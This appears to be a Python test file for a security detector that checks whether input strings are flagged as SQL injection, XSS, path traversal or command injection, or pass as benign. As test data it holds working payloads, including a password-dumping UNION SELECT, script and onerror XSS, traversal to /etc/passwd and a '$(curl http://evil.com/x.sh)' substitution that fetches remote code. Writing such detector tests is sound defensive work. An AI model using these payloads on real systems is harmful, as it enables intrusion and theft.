from secguard.detectors import Category, Severity, is_malicious, scan_value


class TestSqli:
    def test_union_select(self):
        cats = {d.category for d in scan_value("' UNION SELECT password FROM users--")}
        assert Category.SQLI in cats

    def test_or_1_equals_1(self):
        assert is_malicious("1' OR '1'='1")

    def test_url_encoded(self):
        assert is_malicious("%27%20OR%20%271%27%3D%271")


class TestXss:
    def test_script_tag(self):
        assert is_malicious("<script>alert(1)</script>")

    def test_event_handler(self):
        assert is_malicious("<img src=x onerror=alert(1)>")

    def test_url_encoded_script(self):
        assert is_malicious("%3Cscript%3Ealert(1)%3C/script%3E")


class TestPathTraversal:
    def test_dotdot(self):
        cats = {d.category for d in scan_value("../../../../etc/passwd")}
        assert Category.PATH_TRAVERSAL in cats

    def test_url_encoded(self):
        assert is_malicious("%2e%2e%2f%2e%2e%2fetc%2fpasswd")


class TestCommandInjection:
    def test_chained(self):
        cats = {d.category for d in scan_value("; cat /etc/passwd")}
        assert Category.COMMAND_INJECTION in cats or Category.PATH_TRAVERSAL in cats

    def test_substitution(self):
        assert is_malicious("$(curl http://evil.com/x.sh)")


class TestBenign:
    def test_plain_text_not_flagged(self):
        assert not is_malicious("The quick brown fox")

    def test_email_not_flagged(self):
        assert not is_malicious("alice@example.com")

    def test_prose_with_select_not_flagged(self):
        assert not is_malicious("Please select your database plan")

    def test_severity_threshold(self):
        # A bare SQL comment is LOW; should not trip the MEDIUM threshold.
        assert not is_malicious("a -- b", Severity.MEDIUM)
